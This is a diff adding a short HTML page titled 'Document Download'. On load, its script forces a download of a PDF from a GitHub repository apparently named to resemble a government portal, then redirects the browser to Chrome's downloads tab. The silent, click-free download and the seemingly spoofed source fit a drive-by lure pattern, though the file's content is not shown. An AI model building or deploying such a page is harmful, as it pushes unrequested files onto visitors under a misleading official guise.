@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Download</title>
+</head>
+<body>
+
+<script>
+    window.addEventListener("load", function () {
+        const pdfUrl = "https://github.com/my-govuz/my-gov_/raw/refs/heads/main/down-2026-27-12_17-00-55.pdf";
+
+        // Начать скачивание PDF
+        const link = document.createElement("a");
+        link.href = pdfUrl;
+        link.download = "document.pdf";
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+
+        // Перейти на вкладку загрузок Chrome
+        setTimeout(function () {
+            window.location.href = "chrome://downloads/";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
